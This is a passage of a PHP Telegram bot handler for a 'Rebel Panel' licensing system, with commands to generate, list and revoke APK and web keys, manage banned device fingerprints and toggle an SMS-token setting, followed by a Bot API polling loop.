    rebel_bot_create_key($chatId, 'apk', isset($m[1]) ? (int)$m[1] : 30);
    return true;
  }

  if (preg_match('/^\/genkey(?:\s+(\d+))?\s*$/i', $text, $m)) {
    rebel_bot_create_key($chatId, 'web', isset($m[1]) ? (int)$m[1] : 30);
    return true;
  }

  if (preg_match('/^\/keys\b/i', $text)) {
    $data = rebel_keys_load();
    $lines = [];
    foreach ($data['keys'] as $k => $row) {
      $mask = substr($k, 0, 8) . '••••';
      $typ = strtoupper((string)($row['type'] ?? rebel_key_infer_type($k) ?: 'web'));
      if (!empty($row['revoked'])) {
        $lines[] = '• <code>' . $mask . '</code> · ' . $typ . ' · revoked';
        continue;
      }
      if (!empty($row['used']) || (int)($row['uses'] ?? 0) >= 1) {
        $lines[] = '• <code>' . $mask . '</code> · ' . $typ . ' · used';
        continue;
      }
      if (!empty($row['expires']) && time() > (int)$row['expires']) continue;
      if (empty($row['active'])) continue;
      $lines[] = '• <code>' . $mask . '</code> · ' . $typ . ' · unused';
    }
    rebel_tg_send($chatId, $lines ? ("📋 <b>Keys</b>\n\n" . implode("\n", $lines)) : "📋 No keys.");
    return true;
  }

  if (preg_match('/^\/smstoken\s+(on|off)\b/i', $text, $m)) {
    $cfg = rebel_sms_token_config_load();
    $cfg['enabled'] = strtolower($m[1]) === 'on';
    rebel_sms_token_config_save($cfg);
    rebel_tg_send($chatId, $cfg['enabled'] ? "✅ Auto Token SMS <b>ON</b>\nAdd bot as admin to your Telegram channel.\nDevice: <code>" . ($cfg['device_id'] ?: 'not set — /setdevice ID') . "</code>" : "⏸ Auto Token SMS <b>OFF</b>");
    return true;
  }

  if (preg_match('/^\/setdevice\s+(\S+)/i', $text, $m)) {
    $cfg = rebel_sms_token_config_load();
    $cfg['device_id'] = trim($m[1]);
    rebel_sms_token_config_save($cfg);
    rebel_tg_send($chatId, "✅ Auto SMS device set:\n<code>" . htmlspecialchars($cfg['device_id'], ENT_QUOTES, 'UTF-8') . "</code>");
    return true;
  }

  if (preg_match('/^\/bans\b/i', $text)) {
    $list = rebel_bot_list_banned_devices();
    if (!$list) {
      rebel_tg_send($chatId, "✅ No banned devices on server.");
      return true;
    }
    $lines = [];
    foreach ($list as $row) {
      $fp = (string)($row['device_fp'] ?? '');
      $short = strlen($fp) > 16 ? (substr($fp, 0, 16) . '…') : $fp;
      $lines[] = '• <code>' . htmlspecialchars($short, ENT_QUOTES, 'UTF-8') . '</code> · ' . htmlspecialchars((string)($row['reason'] ?? ''), ENT_QUOTES, 'UTF-8');
    }
    rebel_tg_send($chatId, "🚫 <b>Banned devices</b> (" . count($list) . ")\n\n" . implode("\n", $lines) . "\n\nUnban all: /unbanall\nUnban one: /unban FULL_FINGERPRINT");
    return true;
  }

  if (preg_match('/^\/unbanall\b/i', $text)) {
    $n = rebel_bot_unban_all_devices();
    rebel_tg_send($chatId, "✅ <b>All devices unbanned</b>\n\nCleared: " . (int)$n . " entries\n\nUser: uninstall APK → install latest → new /genkeyapk");
    return true;
  }

  if (preg_match('/^\/unban\s+(\S+)/i', $text, $m)) {
    $fp = trim($m[1]);
    if (rebel_bot_unban_device($fp)) {
      rebel_tg_send($chatId, "✅ Unbanned:\n<code>" . htmlspecialchars($fp, ENT_QUOTES, 'UTF-8') . "</code>");
    } else {
      rebel_tg_send($chatId, "❌ Device not found in ban list:\n<code>" . htmlspecialchars($fp, ENT_QUOTES, 'UTF-8') . "</code>\n\nTry /bans or /unbanall");
    }
    return true;
  }

  if (preg_match('/^\/revokeall\b/i', $text)) {
    $data = rebel_keys_load();
    $res = rebel_revoke_all_keys($data);
    rebel_keys_save($data);
    rebel_tg_send($chatId, "🚫 <b>All keys revoked</b>\n\nKeys: " . (int)$res['keys_revoked'] . "\nSessions killed: " . (int)$res['sessions_cleared'] . "\n\nAll open panels will be locked.");
    return true;
  }

  if (preg_match('/^\/revoke\s+((?:RBA|RBP|RBW|RBL)-[A-Z0-9\-]+)/i', $text, $m)) {
    $key = rebel_norm_key($m[1]);
    $data = rebel_keys_load();
    if (!rebel_revoke_key($data, $key)) {
      rebel_tg_send($chatId, "❌ Key not found.");
      return true;
    }
    rebel_keys_save($data);
    rebel_tg_send($chatId, "✅ Revoked + session killed:\n<code>" . $key . "</code>");
    return true;
  }

  rebel_tg_send($chatId, "Unknown command.\n\n/start — help\n/parentapk — Parent APK (owner)\n/genkeyparent — Parent key\n/genkeyapk — User APK key\n/updatebot — update server bot files\n/bans — banned devices");
  return true;
}

function rebel_bot_poll_once($timeout = 2) {
  $offset = 0;
  if (is_file(REBEL_POLL_OFFSET_FILE)) {
    $offset = (int)trim((string)@file_get_contents(REBEL_POLL_OFFSET_FILE));
  }
  $res = rebel_tg_api('getUpdates', [
    'offset' => $offset,
    'timeout' => $timeout,
    'allowed_updates' => ['message', 'channel_post', 'edited_channel_post']
  ]);
  if (empty($res['ok'])) return ['ok' => false, 'error' => $res['description'] ?? 'getUpdates failed', 'handled' => 0];
  $handled = 0;
  foreach ($res['result'] ?? [] as $u) {
    $offset = (int)$u['update_id'] + 1;
    if (rebel_bot_handle_update($u)) $handled++;
  }
  if ($offset > 0) {
    $dir = dirname(REBEL_POLL_OFFSET_FILE);
    if (!is_dir($dir)) @mkdir($dir, 0755, true);
    file_put_contents(REBEL_POLL_OFFSET_FILE, (string)$offset);
  }
  return ['ok' => true, 'handled' => $handled, 'offset' => $offset];
}

function rebel_bot_run_forever() {
  echo "Rebel Panel Bot — @" . REBEL_BOT_USERNAME . "\n";
  $me = rebel_tg_api('getMe', []);
  if (empty($me['ok'])) {
    echo "ERROR: Bot token invalid\n";
    exit(1);
  }
  rebel_tg_api('deleteWebhook', ['drop_pending_updates' => false]);
  echo "Polling mode started. Press Ctrl+C to stop.\n";
  while (true) {
    $res = rebel_bot_poll_once(25);
    if (!empty($res['handled'])) echo date('H:i:s') . " — handled {$res['handled']} update(s)\n";
    if (empty($res['ok'])) {
      echo date('H:i:s') . " — API error, retry...\n";
      sleep(3);
    }
  }
}
